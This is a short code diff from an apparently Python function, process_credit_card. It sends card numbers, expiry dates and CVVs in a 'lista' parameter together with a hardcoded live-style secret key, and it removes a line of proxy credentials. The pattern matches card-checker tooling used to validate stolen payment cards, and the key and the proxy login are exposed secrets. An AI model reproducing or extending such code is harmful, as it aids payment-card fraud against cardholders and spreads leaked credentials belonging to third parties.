@@ -26,7 +26,6 @@ async def process_credit_card(cc_entry):
             params = {
                 "lista": f"{ccn}:{mm}:{yy}:{cvv}",
                 "sk": "sk_live_v6hZVe0J4f3rShGDqOSiwh8v",
-                "proxy": "prox-lu.pointtoserver.com:10799:purevpn0s3978104:hk6vchvcmyah"
             }
 
             async with session.get(url, params=params) as response:
